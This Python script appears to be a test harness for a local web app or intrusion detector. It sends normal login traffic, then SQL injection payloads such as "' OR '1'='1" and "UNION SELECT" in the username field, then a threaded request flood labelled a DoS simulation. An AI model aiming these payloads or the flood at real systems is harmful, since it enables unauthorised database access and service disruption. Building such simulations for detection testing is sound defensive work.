import requests
import time
import random
import threading

TARGET_URL = "http://localhost:5001"

def simulate_normal_traffic():
    print("Starting Normal Traffic Simulation...")
    usernames = ["alice", "bob", "charlie", "dave"]
    for _ in range(20):
        try:
            u = random.choice(usernames)
            requests.post(TARGET_URL, data={"username": u, "password": "password123"})
            time.sleep(random.uniform(0.1, 0.5))
        except:
            pass

def simulate_sqli_attack():
    print("Starting SQL Injection Attack Simulation...")
    payloads = [
        "' OR '1'='1",
        "admin' --",
        "UNION SELECT 1,2,3 --",
        "admin' #",
        "') OR ('1'='1"
    ]
    for _ in range(10):
        try:
            payload = random.choice(payloads)
            print(f"Sending SQLi Payload: {payload}")
            requests.post(TARGET_URL, data={"username": payload, "password": "password123"})
            time.sleep(0.5)
        except:
            pass

def simulate_dos_attack():
    print("Starting DoS Attack Simulation (High Frequency)...")
    def flood():
        for _ in range(50):
            try:
                requests.get(TARGET_URL)
            except:
                pass
    
    threads = []
    for _ in range(10):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        print("Auto Mode: Running all simulations...")
        simulate_normal_traffic()
        simulate_sqli_attack()
        simulate_dos_attack()
    else:
        input("Press Enter to start Normal Traffic...")
        simulate_normal_traffic()
        
        input("Press Enter to start SQL Injection Attack...")
        simulate_sqli_attack()
        
        input("Press Enter to start DoS Simulation...")
        simulate_dos_attack()
    
    print("Simulation Complete.")
